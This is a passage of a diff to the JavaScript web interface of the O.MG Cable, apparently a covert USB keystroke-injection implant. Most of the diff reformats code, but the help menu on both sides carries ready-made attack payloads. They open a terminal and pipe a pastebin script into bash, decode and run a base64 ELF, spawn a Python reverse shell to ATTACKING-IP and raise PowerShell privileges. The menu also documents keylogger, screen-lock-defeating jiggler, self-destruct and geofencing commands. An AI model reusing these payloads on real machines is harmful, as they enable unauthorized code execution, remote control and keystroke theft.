+		
 			logMessage(`CRIT`, `apiResponseC2Status: [data]:[${data}]`);
 			output = document.getElementById(`response-C2Status`);
 			output.value = data;
-
+		
 			if (parameters[1] == "stopped" || parameters[1] == "noprov") {
 				document.getElementById(`c2status`).classList.remove(`active`);
 			} else {
@@ -5320,95 +5217,66 @@ DELAY 2000
 				document.getElementById(`c2configApplied`).innerHTML = parameters[1];
 			}
 		}
-
+		
 		function apiResponseC2Wipe(data) {
-			const {
-				response,
-				parameters
-			} = parseData(data);
-
+			const { response, parameters } = parseData(data);
+		
 			logMessage(`CRIT`, `apiResponseC2Wipe: [data]:[${data}]`);
 			output = document.getElementById(`response-C2Wipe`);
 			output.value = data;
 		}
-
+		
 		// Stealth Module
 		function apiResponseCU(data) {
-			const {
-				response,
-				parameters
-			} = parseData(data);
-
+			const { response, parameters } = parseData(data);
+		
 			function setElementValue(id, value) {
 				const element = document.getElementById(id);
 				if (element) {
 					element.value = value;
 				}
 			}
-
+		
 			logMessage(`CRIT`, `apiResponseCU: [data]:[${response}]`);
 			setElementValue('response-CU', response);
 		}
-
+		
 		// About Menu Module
-		const releaseTeam = [{
-				"name": "Kalani",
-				"twitter": "KalaniMakutu",
-				"role": "Application"
-			},
-			{
-				"name": "MG",
-				"twitter": "_MG_",
-				"role": "Hardware"
-			},
-			{
-				"name": "Ø1phor1³",
-				"twitter": "01p8or13",
-				"role": "Tools & Testing"
-			},
-			{
-				"name": "r3dct3d",
-				"twitter": "r3dct3d",
-				"role": "Firmware / Keylogger"
-			},
-			{
-				"name": "RoganDawes",
-				"twitter": "RoganDawes",
-				"role": "Researcher @sensepost"
-			},
-			{
-				"name": "Wasabi",
-				"twitter": "spiceywasabi",
-				"role": "Tooling & Infrastructure"
-			},
+		const releaseTeam = [
+			{ "name": "Kalani", "twitter": "KalaniMakutu", "role": "Application" },
+			{ "name": "MG", "twitter": "_MG_", "role": "Hardware" },
+			{ "name": "Ø1phor1³", "twitter": "01p8or13", "role": "Tools & Testing" },
+			{ "name": "r3dct3d", "twitter": "r3dct3d", "role": "Firmware" },
+			{ "name": "RoganDawes", "twitter": "RoganDawes", "role": "Researcher @sensepost" },
+			{ "name": "Wasabi", "twitter": "spiceywasabi", "role": "Tools & Infrastructure" },
 		];
-
+		
 		function generateReleaseTeam() {
 			logMessage(`DEBUG`, `generateReleaseTeam`);
 			const releaseTeamContainer = document.getElementById("releaseTeam");
 			releaseTeamContainer.innerHTML = "";
-
+		
 			releaseTeam.forEach((member) => {
 				const teamMemberElement = createTeamMemberElement(member);
 				releaseTeamContainer.appendChild(teamMemberElement);
 			});
-
+		
 			if (releaseTeam.length % 2 !== 0) {
 				const spacer = document.createElement('br');
 				spacer.className = 'team-member-container';
 				releaseTeamContainer.appendChild(spacer);
 			}
 		}
-
+		
 		function createTeamMemberElement(member) {
 			const container = document.createElement("div");
 			container.className = "team-member-container";
-
+		
 			const name = document.createElement("div");
 			name.className = "about-team-name";
 			name.textContent = member.name;
 			container.appendChild(name);
-
+		
 			const twitter = document.createElement("div");
 			const twitterLink = document.createElement("a");
 			twitter.className = "about-twitter";
@@ -5416,15 +5284,15 @@ DELAY 2000
 			twitterLink.textContent = "@" + member.twitter;
 			twitter.appendChild(twitterLink);
 			container.appendChild(twitter);
-
+		
 			const role = document.createElement("div");
 			role.className = "about-role";
 			role.textContent = member.role;
 			container.appendChild(role);
-
+		
 			return container;
 		}
-
+		
 		function createRegulatory() {
 			createDialog({
 				id: 'regulatory',
@@ -5445,7 +5313,7 @@ DELAY 2000
 				closeEnabled: true,
 			});
 		}
-
+		
 		// Help Menu Module
 		const helpElementIds = [
 			"helppayloadExample",
@@ -5456,534 +5324,360 @@ DELAY 2000
 			"helpselfDestruct",
 			"helpglobalKeys"
 		];
-
+		
 		let helpMenuItems = [{
 			"feat": "payloadExample",
 			"name": "MacOS Payload Combo",
 			"desc": "On a macOS system, open a Terminal, download the contents of a file posted on pastebin, and execute its contents.",
-			"code": [{
-				example: 'REM To avoid "new keyboard" pop up, update the VID/PID to your target environment. https://usb-ids.gowdy.us/read/UD/\nVID 1337\nPID C0D3\nGUI SPACE\nDELAY 1000\nSTRING Terminal\nENTER\nDELAY 1\nSTRING curl -sL pastebin.com/raw/TR4G7CUg|bash\nENTER'
-			}]
+			"code": [{ example: 'REM To avoid "new keyboard" pop up, update the VID/PID to your target environment. https://usb-ids.gowdy.us/read/UD/\nVID 1337\nPID C0D3\nGUI SPACE\nDELAY 1000\nSTRING Terminal\nENTER\nDELAY 1\nSTRING curl -sL pastebin.com/raw/TR4G7CUg|bash\nENTER' }]
 		}, {
 			"feat": "payloadExample",
 			"name": "Linux Payload Combo",
 			"desc": "On a Linux system, open a Terminal, download the contents of a file posted on pastebin, and execute its contents.",
-			"code": [{
-				example: 'VID 1337\nPID C0D3\nGUI\nDELAY 1000\nSTRING Terminal\nENTER\nDELAY 5000\nSTRING curl -sL pastebin.com/raw/TR4G7CUg|bash\nENTER'
-			}]
+			"code": [{ example: 'VID 1337\nPID C0D3\nGUI\nDELAY 1000\nSTRING Terminal\nENTER\nDELAY 5000\nSTRING curl -sL pastebin.com/raw/TR4G7CUg|bash\nENTER' }]
 		}, {
 			"feat": "payloadExample",
 			"name": "Linux Netspooky B64 Combo",
 			"desc": "On a Linux system, open a Terminal, decode a base64 string, save to a file, set as executable, and run the file.",
-			"code": [{
-				example: 'GUI\nSTRING Terminal\nENTER\nDELAY 3000\nSTRING base64 -d <<< f0VMRgIBAQCwPEgx/w8FAAIAPgABAAAACABAAAAAAABAAAAAAAAAAFABAAAAAAAAAAAAAEAAOAABAEAABQAEAAEAAAAFAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAewAAAAAAAAB7AAAAAAAAAAAAIAAAAAAA >s;chmod +x s;./s\nENTER'
-			}]
+			"code": [{ example: 'GUI\nSTRING Terminal\nENTER\nDELAY 3000\nSTRING base64 -d <<< f0VMRgIBAQCwPEgx/w8FAAIAPgABAAAACABAAAAAAABAAAAAAAAAAFABAAAAAAAAAAAAAEAAOAABAEAABQAEAAEAAAAFAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAewAAAAAAAAB7AAAAAAAAAAAAIAAAAAAA >s;chmod +x s;./s\nENTER' }]
 		}, {
 			"feat": "payloadExample",
 			"name": "Linux Boot Jiggle Payload Suicide",
 			"desc": "On a Linux system, start the Mouse Jiggler, wait for 40 minutes, and then open a Terminal, download the contents of a file from pastebin, and execute its contents, then perform a Self Destruct on the O.MG Device.",
-			"code": [{
-				example: 'JIGGLER ON\nDELAY 240000\nGUI\nDELAY 1\nSTRING Terminal\nENTER\nDELAY 5000\nSTRING curl -sL pastebin.com/raw/TR4G7CUg|bash\nENTER\nSELF-DESTRUCT'
-			}]
+			"code": [{ example: 'JIGGLER ON\nDELAY 240000\nGUI\nDELAY 1\nSTRING Terminal\nENTER\nDELAY 5000\nSTRING curl -sL pastebin.com/raw/TR4G7CUg|bash\nENTER\nSELF-DESTRUCT' }]
 		}, {
 			"feat": "payloadExample",
 			"name": "Linux Reverse Shell Python",
 			"desc": "On a Linux system, open a Terminal, and using Python create a reverse shell.",
-			"code": [{
-				example: 'GUI\nSTRING Terminal\nENTER\nDELAY 3000\nSTRING python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKING-IP\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\"\nENTER'
-			}]
+			"code": [{ example: 'GUI\nSTRING Terminal\nENTER\nDELAY 3000\nSTRING python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKING-IP\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\"\nENTER' }]
 		}, {
 			"feat": "payloadExample",
 			"name": "Win10 Admin PowerShell Enable PS1 Scripts",
 			"desc": "On a Windows system, open Powershell and set the execution policy to allow *.ps1 scripts.",
-			"code": [{
-				example: 'GUI r\nDELAY 2000\nSTRING PowerShell\nDELAY 1\nENTER\nDELAY 2000\nSTRING Start-Process PowerShell -Verb RunAs\nDELAY 1000\nENTER\nDELAY 1000\nLEFT\nENTER\nDELAY 3000\nSTRING Set-ExecutionPolicy RemoteSigned\nDELAY 2000\nENTER\nSTRING A\nDELAY 2000\nENTER'
-			}]
+			"code": [{ example: 'GUI r\nDELAY 2000\nSTRING PowerShell\nDELAY 1\nENTER\nDELAY 2000\nSTRING Start-Process PowerShell -Verb RunAs\nDELAY 1000\nENTER\nDELAY 1000\nLEFT\nENTER\nDELAY 3000\nSTRING Set-ExecutionPolicy RemoteSigned\nDELAY 2000\nENTER\nSTRING A\nDELAY 2000\nENTER' }]
 		}, {
 			"feat": "payloadExample",
 			"name": "Win10 PowerShell",
 			"desc": "On a Windows system, open PowerShell.",
-			"code": [{
-				example: 'GUI r\nDELAY 1000\nSTRING PowerShell\nENTER'
-			}]
+			"code": [{ example: 'GUI r\nDELAY 1000\nSTRING PowerShell\nENTER' }]
 		}, {
 			"feat": "payloadExample",
 			"name": "Win10 1",
 			"desc": "On a Windows system, download the contents of a file posted on pastebin, and execute its contents.",
-			"code": [{
-				example: 'STRING wget pastebin.com/raw/CR8QprvH -Outfile y.ps1\nENTER'
-			}]
+			"code": [{ example: 'STRING wget pastebin.com/raw/CR8QprvH -Outfile y.ps1\nENTER' }]
 		}, {
 			"feat": "payloadExample",
 			"name": "Win10 2",
 			"desc": "On a Windows system, print the string 'rekt'",
-			"code": [{
-				example: 'STRING $x=echo rekt\nENTER\nSTRING $x\nENTER'
-			}]
+			"code": [{ example: 'STRING $x=echo rekt\nENTER\nSTRING $x\nENTER' }]
 		}, {
 			"feat": "payloadExample",
 			"name": "Win10 Combo",
 			"desc": "On a Windows system, open Powershell and print the string 'rekt'",
-			"code": [{
-				example: 'VID 1337\nPID C0D3\nGUI r\nDELAY 1000\nSTRING PowerShell\nENTER\nDELAY 5000\nSTRING $x=echo rekt\nENTER\nSTRING $x\nENTER'
-			}]
+			"code": [{ example: 'VID 1337\nPID C0D3\nGUI r\nDELAY 1000\nSTRING PowerShell\nENTER\nDELAY 5000\nSTRING $x=echo rekt\nENTER\nSTRING $x\nENTER' }]
 		}, {
 			"feat": "payloadExample",
 			"name": "Check wifi for target location",
 			"desc": "Use the GeoFencing Module to detect if a WiFi Network is present, and if so print a string on the target.",
-			"code": [{
-				example: 'VID 1337\nPID C0D3\nSTRING Checking if cable is still in the target location...\nENTER\nIF_PRESENT SSID="TargetSSID"\nSTRING Cable looks to be at the target location, it\'s safe to run the payload!\nENTER'
-			}]
+			"code": [{ example: 'VID 1337\nPID C0D3\nSTRING Checking if cable is still in the target location...\nENTER\nIF_PRESENT SSID="TargetSSID"\nSTRING Cable looks to be at the target location, it\'s safe to run the payload!\nENTER' }]
 		}, {
 			"feat": "payloadExample",
 			"name": "Check wifi for safe location",
 			"desc": "Use the GeoFencing Module to detect if a WiFi network is not present, and if so print a string on the target.",
-			"code": [{
-				example: 'VID 1337\nPID C0D3\nSTRING Checking if cable is in the off limits location before running payload...\nENTER\nIF_NOTPRESENT SSID="OffLimitsSSID"\nSTRING If this is being typed, it means the OffLimitsSSID as not seen!\nENTER'
-			}]
+			"code": [{ example: 'VID 1337\nPID C0D3\nSTRING Checking if cable is in the off limits location before running payload...\nENTER\nIF_NOTPRESENT SSID="OffLimitsSSID"\nSTRING If this is being typed, it means the OffLimitsSSID as not seen!\nENTER' }]
 		}, {
 			"feat": "payloadExample",
 			"name": "MacOS Text-to-Speech Example",
 			"desc": "On macOS, Launch terminal and use the command 'say' to read out a string.",
-			"code": [{
-				example: 'DELAY 200\nGUI SPACE\nDELAY 200\nSTRING Terminal\nENTER\nDELAY 200\nSTRING say "We have been trying to reach you concerning your vehicles extended warranty. You should have received a notice in the mail about your cars extended warranty eligibility. Since we have not gotten a response, we are giving you a final courtesy call before we close out your file. Press 2 to be removed and placed on our do-not-call list. To speak to someone about possibly extending or reinstating your vehicles warranty, press 1 to speak with a warranty specialist."\nENTER'
-			}]
+			"code": [{ example: 'DELAY 200\nGUI SPACE\nDELAY 200\nSTRING Terminal\nENTER\nDELAY 200\nSTRING say "We have been trying to reach you concerning your vehicles extended warranty. You should have received a notice in the mail about your cars extended warranty eligibility. Since we have not gotten a response, we are giving you a final courtesy call before we close out your file. Press 2 to be removed and placed on our do-not-call list. To speak to someone about possibly extending or reinstating your vehicles warranty, press 1 to speak with a warranty specialist."\nENTER' }]
 		}, {
 			"feat": "payloadExample",
 			"name": "Windows Text-to-Speech Example",
 			"desc": "On Windows, Launch Powershell and use the System.speech to read out a string.",
-			"code": [{
-				example: 'DELAY 200\nGUI r\nDELAY 200\nSTRING Powershell\nENTER\nDELAY 200\nSTRING Add-Type -AssemblyName System.speech\nENTER\nSTRING $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer\nENTER\nSTRING $speak.Speak("We have been trying to reach you concerning your vehicles extended warranty. You should have received a notice in the mail about your cars extended warranty eligibility. Since we have not gotten a response, we are giving you a final courtesy call before we close out your file. Press 2 to be removed and placed on our do-not-call list. To speak to someone about possibly extending or reinstating your vehicles warranty, press 1 to speak with a warranty specialist.")\nENTER'
-			}]
+			"code": [{ example: 'DELAY 200\nGUI r\nDELAY 200\nSTRING Powershell\nENTER\nDELAY 200\nSTRING Add-Type -AssemblyName System.speech\nENTER\nSTRING $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer\nENTER\nSTRING $speak.Speak("We have been trying to reach you concerning your vehicles extended warranty. You should have received a notice in the mail about your cars extended warranty eligibility. Since we have not gotten a response, we are giving you a final courtesy call before we close out your file. Press 2 to be removed and placed on our do-not-call list. To speak to someone about possibly extending or reinstating your vehicles warranty, press 1 to speak with a warranty specialist.")\nENTER' }]
 		}, {
 			"feat": "payloadUSBIDs",
 			"name": "VID",
 			"desc": "Set Vendor ID",
-			"code": [{
-				"example": "VID 1234"
-			}]
+			"code": [{ "example": "VID 1234" }]
 		}, {
 			"feat": "payloadUSBIDs",
 			"name": "PID",
 			"desc": "Set Product ID",
-			"code": [{
-				"example": "PID ABCD"
-			}]
+			"code": [{ "example": "PID ABCD" }]
 		}, {
 			"feat": "payloadUSBIDs",
 			"name": "MAN",
 			"desc": "Set iManufacturer descriptor (length 40)",
-			"code": [{
-				"example": "MAN O.MG"
-			}]
+			"code": [{ "example": "MAN O.MG" }]
 		}, {
 			"feat": "payloadUSBIDs",
 			"name": "PRO",
 			"desc": "Set iProduct descriptor (length 40)",
-			"code": [{
-				"example": "PRO O.MG-CABLE"
-			}]
+			"code": [{ "example": "PRO O.MG-CABLE" }]
 		}, {
 			"feat": "payloadUSBIDs",
 			"name": "SER",
 			"desc": "Set iSerial descriptor (length 40)",
-			"code": [{
-				"example": "SER 0123456789"
-			}]
+			"code": [{ "example": "SER 0123456789" }]
 		}, {
 			"feat": "payloadUSBIDs",
 			"name": "VID_RANDOM",
 			"desc": "Set Vendor ID to a random 4-digit HEX Value",
-			"code": [{
-				"example": "VID_RANDOM"
-			}]
+			"code": [{ "example": "VID_RANDOM" }]
 		}, {
 			"feat": "payloadUSBIDs",
 			"name": "PID_RANDOM",
 			"desc": "Set Product ID to a random 4-digit HEX Value",
-			"code": [{
-				"example": "PID_RANDOM"
-			}]
+			"code": [{ "example": "PID_RANDOM" }]
 		}, {
 			"feat": "payloadUSBIDs",
 			"name": "MAN_RANDOM",
 			"desc": "Set iManufacturer descriptor to a random plausible string",
-			"code": [{
-				"example": "MAN_RANDOM"
-			}]
+			"code": [{ "example": "MAN_RANDOM" }]
 		}, {
 			"feat": "payloadUSBIDs",
 			"name": "PRO_RANDOM",
 			"desc": "Set iProduct descriptor to a random plausible string",
-			"code": [{
-				"example": "PRO_RANDOM"
-			}]
+			"code": [{ "example": "PRO_RANDOM" }]
 		}, {
 			"feat": "payloadUSBIDs",
 			"name": "SER_RANDOM",
 			"desc": "Set iSerial descriptor to a random plausible string",
-			"code": [{
-				"example": "SER_RANDOM"
-			}]
+			"code": [{ "example": "SER_RANDOM" }]
 		}, {
 			"feat": "payload",
 			"name": "STRING",
 			"desc": "Type a sequence of letter",
-			"code": [{
-				"example": "STRING Hello World!"
-			}]
+			"code": [{ "example": "STRING Hello World!" }]
 		}, {
 			"feat": "payload",
 			"name": "STRINGLN",
 			"desc": "Type a sequence of letter, followed by ENTER",
-			"code": [{
-				"example": "STRINGLN Hello World!"
-			}]
+			"code": [{ "example": "STRINGLN Hello World!" }]
 		}, {
 			"feat": "payload",
 			"name": "REM",
 			"desc": "Comment. This line will be removed by the compiler.",
-			"code": [{
-				"example": "REM Hello World!"
-			}]
+			"code": [{ "example": "REM Hello World!" }]
 		}, {
 			"feat": "payload",
 			"name": "REM_BLOCK",
 			"desc": "Comment. This block will be removed by the compiler.",
-			"code": [{
-				"example": "REM_BLOCK Hello,\n World!\nEND_REM"
-			}]
+			"code": [{ "example": "REM_BLOCK Hello,\n World!\nEND_REM" }]
 		}, {
 			"feat": "payload",
 			"name": "RANDOM_LOWERCASE_LETTER",
 			"desc": "Type a single random character from the set: abcdefghijklmnopqrstuvwxyz",
-			"code": [{
-				"example": "RANDOM_LOWERCASE_LETTER"
-			}]
+			"code": [{ "example": "RANDOM_LOWERCASE_LETTER" }]
 		}, {
 			"feat": "payload",
 			"name": "RANDOM_UPPERCASE_LETTER",
 			"desc": "Type a single random character from the set: ABCDEFGHIJKLMNOPQRSTUVWXYZ",
-			"code": [{
-				"example": "RANDOM_UPPERCASE_LETTER"
-			}]
+			"code": [{ "example": "RANDOM_UPPERCASE_LETTER" }]
 		}, {
 			"feat": "payload",
 			"name": "RANDOM_LETTER",
 			"desc": "Type a single random character from the set: abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
-			"code": [{
-				"example": "RANDOM_LETTER"
-			}]
+			"code": [{ "example": "RANDOM_LETTER" }]
 		}, {
 			"feat": "payload",
 			"name": "RANDOM_NUMBER",
 			"desc": "Type a single random character from the set: 0123456789",
-			"code": [{
-				"example": "RANDOM_NUMBER"
-			}]
+			"code": [{ "example": "RANDOM_NUMBER" }]
 		}, {
 			"feat": "payload",
 			"name": "RANDOM_SPECIAL",
 			"desc": "Type a single random character from the set: !@#$%^&*()",
-			"code": [{
-				"example": "RANDOM_SPECIAL"
-			}]
+			"code": [{ "example": "RANDOM_SPECIAL" }]
 		}, {
 			"feat": "payload",
 			"name": "RANDOM_CHAR",
 			"desc": "Type a single random character from the set: abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()",
-			"code": [{
-				"example": "RANDOM_CHAR"
-			}]
+			"code": [{ "example": "RANDOM_CHAR" }]
 		}, {
 			"feat": "payload",
 			"name": "FUNCTION",
 			"desc": "FUNCTION is a block of code that can be ran via a single reference, with optional DEFINE constants provided as parameters. One may consider the use of a FUNCTION within a payload like a find-and-replace at time of compile.",
-			"code": [{
-					"example": "FUNCTION functionName()\nSTRING Hello, World!\nEND_FUNCTION"
-				},
-				{
-					"example": "FUNCTION launchApp(#VAR1, #VAR2)\nGUI SPACE\nSTRING #VAR1\nENTER\nGUI f\nSTRING #VAR2\nEND_FUNCTION"
-				},
-				{
-					"example": "launchApp(Safari, www.google.com)"
-				}
+			"code": [{ "example": "FUNCTION functionName()\nSTRING Hello, World!\nEND_FUNCTION" },
+				{ "example": "FUNCTION launchApp(#VAR1, #VAR2)\nGUI SPACE\nSTRING #VAR1\nENTER\nGUI f\nSTRING #VAR2\nEND_FUNCTION" },
+				{ "example": "launchApp(Safari, www.google.com)" }
 			]
 		}, {
 			"feat": "payload",
 			"name": "DEFINE",
 			"desc": "DEFINE a constant. One may consider the use of a DEFINE within a payload like a find-and-replace at time of compile.",
-			"code": [{
-					"example": "DEFINE #WAIT 2000"
-				},
-				{
-					"example": "DEFINE #TEXT Hello World"
-				},
-				{
-					"example": "DEFINE #MYURL example.com"
-				},
-				{
-					"example": "DELAY #WAIT"
-				},
-				{
-					"example": "STRINGLN #TEXT"
-				},
-				{
-					"example": "STRING https://#MYURL"
-				},
+			"code": [{ "example": "DEFINE #WAIT 2000" },
+				{ "example": "DEFINE #TEXT Hello World" },
+				{ "example": "DEFINE #MYURL example.com" },
+				{ "example": "DELAY #WAIT" },
+				{ "example": "STRINGLN #TEXT" },
+				{ "example": "STRING https://#MYURL" },
 			]
 		}, {
 			"feat": "payload",
 			"name": "REPEAT",
 			"desc": "Repeat the following command n-times.",
-			"code": [{
-				"example": "REPEAT 5 STRINGLN Test"
-			}]
+			"code": [{ "example": "REPEAT 5 STRINGLN Test" }]
 		}, {
 			"feat": "payload",
 			"name": "MOUSE",
 			"desc": "Emulate a mouse via DuckyScript. In the below code example, the mouse will move to the probable 0x0 coordinate, move left 200, move down 30, click the left mouse button. By default, buttons are: 1 = Left Click, 2 = Middle, 3 = Right, 4 = Scroll Up, 5 = Scroll Down, 6 = Back, 7 = Forward",
-			"code": [{
-					"example": "MOUSE MOVE [X: +/- INTEGER] [Y: +/- INTEGER]"
-				},
-				{
-					"example": "MOUSE CLICK [MOUSE BUTTON NUMBER 1-15]"
-				},
-				{
-					"example": "MOUSE MOVE -10000 -10000"
-				},
-				{
-					"example": "MOUSE MOVE 200 30"
-				},
-				{
-					"example": "MOUSE CLICK 1"
-				}
+			"code": [{ "example": "MOUSE MOVE [X: +/- INTEGER] [Y: +/- INTEGER]" },
+				{ "example": "MOUSE CLICK [MOUSE BUTTON NUMBER 1-15]" },
+				{ "example": "MOUSE MOVE -10000 -10000" },
+				{ "example": "MOUSE MOVE 200 30" },
+				{ "example": "MOUSE CLICK 1" }
 			]
 		}, {
 			"feat": "payload",
 			"name": "USB",
 			"desc": "Turn USB on/off (enumerate the implant as a USB device to the host)",
-			"code": [{
-					"example": "USB ON"
-				},
-				{
-					"example": "USB OFF"
-				}
+			"code": [{ "example": "USB ON" },
+				{ "example": "USB OFF" }
 			]
 		}, {
 			"feat": "payload",
 			"name": "HIDX",
 			"desc": "Turn HIDX TCP Service on/off",
-			"code": [{
-					"example": "HIDX ON"
-				},
-				{
-					"example": "HIDX OFF"
-				}
+			"code": [{ "example": "HIDX ON" },
+				{ "example": "HIDX OFF" }
 			]
 		}, {
 			"feat": "payload",
 			"name": "USB_RESET",
 			"desc": "Reset the USB Interface, casuing it to re-enumerate the implant as a USB device to the host.",
-			"code": [{
-				"example": "USB_RESET"
-			}]
+			"code": [{ "example": "USB_RESET" }]
 		}, {
 			"feat": "payload",
 			"name": "JIGGLER",
 			"desc": "Turn mouse jiggler on or off. This will move the mouse randomly one pixel left or right every 25 seconds to keep the screen lock feature of the os from turning on.",
-			"code": [{
-					"example": "JIGGLER ON"
-				},
-				{
-					"example": "JIGGLER OFF"
-				}
+			"code": [{ "example": "JIGGLER ON" },
+				{ "example": "JIGGLER OFF" }
 			]
 		}, {
 			"feat": "keylog",
 			"name": "KEYLOGGER",
 			"desc": "Turn keylogger on or off. By default, the keylogging mode is Keystroke.",
-			"code": [{
-					"example": "KEYLOGGER ON"
-				},
-				{
-					"example": "KEYLOGGER ON KEY"
-				},
-				{
-					"example": "KEYLOGGER ON HID"
-				},
-				{
-					"example": "KEYLOGGER OFF"
-				}
+			"code": [{ "example": "KEYLOGGER ON" },
+				{ "example": "KEYLOGGER ON KEY" },
+				{ "example": "KEYLOGGER ON HID" },
+				{ "example": "KEYLOGGER OFF" }
 			]
 		}, {
 			"feat": "payload",
 			"name": "REBOOT",
 			"desc": "Reboot backend cable firmware",
-			"code": [{
-				"example": "REBOOT"
-			}]
+			"code": [{ "example": "REBOOT" }]
 		}, {
 			"feat": "payload",
 			"name": "CAPSLOCK_DISABLE",
 			"desc": "Check if CAPSLOCK is on. If so, toggle off for the duration of payload. On completion, return to previous state.",
-			"code": [{
-				"example": "CAPSLOCK_DISABLE"
-			}]
+			"code": [{ "example": "CAPSLOCK_DISABLE" }]
 		}, {
 			"feat": "payload",
 			"name": "DELAY",
 			"desc": "Delay for a number of milliseconds",
-			"code": [{
-				"example": "DELAY 500"
-			}]
+			"code": [{ "example": "DELAY 500" }]
 		}, {
 			"feat": "payload",
 			"name": "DEFAULT_DELAY",
 			"desc": "Add an automatic DELAY preceeding each command for a number of milliseconds",
-			"code": [{
-				"example": "DEFAULT_DELAY 500"
-			}]
+			"code": [{ "example": "DEFAULT_DELAY 500" }]
 		}, {
 			"feat": "payload",
 			"name": "DEFAULT_DELAY_JITTER",
 			"desc": "Take the value from DEFAULT_DELAY and select a random number between 0 and the value specified. The result is added to the DEFAULT_DELAY in milliseconds",
-			"code": [{
-				"example": "DEFAULT_DELAY_JITTER 500"
-			}]
+			"code": [{ "example": "DEFAULT_DELAY_JITTER 500" }]
 		}, {
 			"feat": "payload",
 			"name": "DEFAULT_CHAR_DELAY",
 			"desc": "Add an automatic DELAY between each STRING character for a number of milliseconds",
-			"code": [{
-				"example": "DEFAULT_CHAR_DELAY 500"
-			}]
+			"code": [{ "example": "DEFAULT_CHAR_DELAY 500" }]
 		}, {
 			"feat": "payload",
 			"name": "DEFAULT_CHAR_DELAY_JITTER",
 			"desc": "Take the value from DEFAULT_CHAR_DELAY and select a random number between 0 and the value specified. The result is added to the DEFAULT_CHAR_DELAY in milliseconds",
-			"code": [{
-				"example": "DEFAULT_CHAR_DELAY_JITTER 500"
-			}]
+			"code": [{ "example": "DEFAULT_CHAR_DELAY_JITTER 500" }]
 		}, {
 			"feat": "payload",
 			"name": "DUCKY_LANG",
 			"desc": `Specify Language Keymap used during payload execution. Available keymaps: ${keymapListPretty}`,
-			"code": [{
-					"example": "DUCKY_LANG US"
-				},
-				{
-					"example": "DUCKY_LANG FR"
-				}
+			"code": [{ "example": "DUCKY_LANG US" },
+				{ "example": "DUCKY_LANG FR" }
 			]
 		}, {
 			"feat": "payloadGeofencing",
 			"name": "IF_PRESENT",
 			"desc": "Run the payload if a 2.4GHz SSID/BSSID is seen. This only scans once. Optionally, specify SIGNAL for a minimum signal strength, measured in RSSi, with a range from high to low of 00 - 99 (00 being the strongest signal).",
-			"code": [{
-					"example": 'IF_PRESENT SSID="SSIDNAME"'
-				},
-				{
-					"example": 'IF_PRESENT BSSID="AA:BB:CC:DD:EE:FF"'
-				}
+			"code": [{ "example": 'IF_PRESENT SSID="SSIDNAME"' },
+				{ "example": 'IF_PRESENT BSSID="AA:BB:CC:DD:EE:FF"' }
 			]
 		}, {
 			"feat": "payloadGeofencing",
 			"name": "IF_NOTPRESENT",
 			"desc": "Run the payload if a 2.4GHz SSID/BSSID is not seen. This only scans once. Optionally, specify SIGNAL for a minimum signal strength, measured in RSSi, with a range of 00 - 99 (00 being the strongest signal).",
-			"code": [{
-					"example": 'IF_NOTPRESENT SSID="SSIDNAME"'
-				},
-				{
-					"example": 'IF_NOTPRESENT BSSID="AA:BB:CC:DD:EE:FF"'
-				}
+			"code": [{ "example": 'IF_NOTPRESENT SSID="SSIDNAME"' },
+				{ "example": 'IF_NOTPRESENT BSSID="AA:BB:CC:DD:EE:FF"' }
 			]
 		}, {
 			"feat": "payloadGeofencing",
 			"name": "WAIT_FOR_PRESENT",
 			"desc": "Wait for a 2.4GHz SSID/BSSID to be present before continuing the rest of the payload. Specify MINUTES for a timeout, or it will run forever. Specify INTERVAL in seconds for how often the scan will happen. An INTERVAL less than 60sec tends to make it hard for most clients to retain a connection to the Web UI.",
-			"code": [{
-					"example": 'WAIT_FOR_PRESENT SSID="MySSID"'
-				},
-				{
-					"example": 'WAIT_FOR_PRESENT BSSID="AA:BB:CC:DD:EE:FF"'
-				},
-				{
-					"example": 'WAIT_FOR_PRESENT SSID="MySSID" MINUTES="2" INTERVAL="90"'
-				},
-				{
-					"example": 'WAIT_FOR_PRESENT BSSID="AA:BB:CC:DD:EE:FF" MINUTES="2" INTERVAL="90"'
-				}
+			"code": [{ "example": 'WAIT_FOR_PRESENT SSID="MySSID"' },
+				{ "example": 'WAIT_FOR_PRESENT BSSID="AA:BB:CC:DD:EE:FF"' },
+				{ "example": 'WAIT_FOR_PRESENT SSID="MySSID" MINUTES="2" INTERVAL="90"' },
+				{ "example": 'WAIT_FOR_PRESENT BSSID="AA:BB:CC:DD:EE:FF" MINUTES="2" INTERVAL="90"' }
 			]
 		}, {
 			"feat": "payloadGeofencing",
 			"name": "WAIT_FOR_NOTPRESENT",
 			"desc": "Wait for a 2.4GHz SSID/BSSID to NOT be present before continuing the rest of the payload. Specify MINUTES for a timeout, or it will run forever. Specify INTERVAL in seconds for how often the scan will happen. An INTERVAL less than 60sec tends to make it hard for most clients to retain a connection to the Web UI.",
-			"code": [{
-					"example": 'WAIT_FOR_NOTPRESENT SSID="MySSID"'
-				},
-				{
-					"example": 'WAIT_FOR_NOTPRESENT BSSID="AA:BB:CC:DD:EE:FF"'
-				},
-				{
-					"example": 'WAIT_FOR_NOTPRESENT SSID="MySSID" MINUTES="2" INTERVAL="90"'
-				},
-				{
-					"example": 'WAIT_FOR_NOTPRESENT BSSID="AA:BB:CC:DD:EE:FF" MINUTES="2" INTERVAL="90"'
-				}
+			"code": [{ "example": 'WAIT_FOR_NOTPRESENT SSID="MySSID"' },
+				{ "example": 'WAIT_FOR_NOTPRESENT BSSID="AA:BB:CC:DD:EE:FF"' },
+				{ "example": 'WAIT_FOR_NOTPRESENT SSID="MySSID" MINUTES="2" INTERVAL="90"' },
+				{ "example": 'WAIT_FOR_NOTPRESENT BSSID="AA:BB:CC:DD:EE:FF" MINUTES="2" INTERVAL="90"' }
 			]
 		}, {
 			"feat": "selfDestruct",
